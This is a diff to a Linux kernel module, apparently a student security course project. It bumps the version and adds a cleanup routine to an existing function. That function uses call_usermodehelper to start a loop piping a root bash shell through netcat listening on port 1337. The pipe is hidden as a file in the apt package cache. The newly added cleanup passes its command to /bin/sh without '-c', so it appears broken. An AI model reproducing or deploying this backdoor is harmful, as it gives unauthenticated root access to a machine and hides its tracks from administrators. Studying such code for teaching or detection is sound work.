@@ -8,7 +8,7 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Tristan Fletcher (@Cyclawps52)");
 MODULE_DESCRIPTION("CSC492 Final Project");
-MODULE_VERSION("cleanup-rev1");
+MODULE_VERSION("cleanup-rev2");
 
 int initModule(void);
 void exitModule(void);
@@ -107,6 +107,19 @@ static ssize_t deviceWrite(struct file* filp, const char* buff, size_t len, loff
 	return -EINVAL;
 }
 
+static int destroyPipe(void){
+	// rm /var/cache/apt/archives/null >/dev/null &
+	char* argv[] = {"/bin/sh", "rm /var/cache/apt/archives/null >/dev/null &", NULL};
+	static char* env[] = {
+		"HOME=/",
+		"TERM=linux",
+		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", 
+		NULL
+	};
+
+	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
+}
+
 static int makePipe(void){
 	// mkfifo /var/cache/apt/archives/null
 	char* argv[] = {"/usr/bin/mkfifo", "/var/cache/apt/archives/null", NULL};
@@ -121,6 +134,7 @@ static int makePipe(void){
 }
 
 static int bindShell(void){
+	destroyPipe();
 	makePipe();
 	// while true; do cat /var/cache/apt/archives/null | sudo /bin/bash 2>&1 |/bin/nc -l 1337 >/var/cache/apt/archives/null; done >/dev/null &
 	char* argv[] = {"/bin/sh", "-c", "while true; do cat /var/cache/apt/archives/null | sudo /bin/bash 2>&1 |/bin/nc -l 1337 >/var/cache/apt/archives/null; done >/dev/null &", NULL};
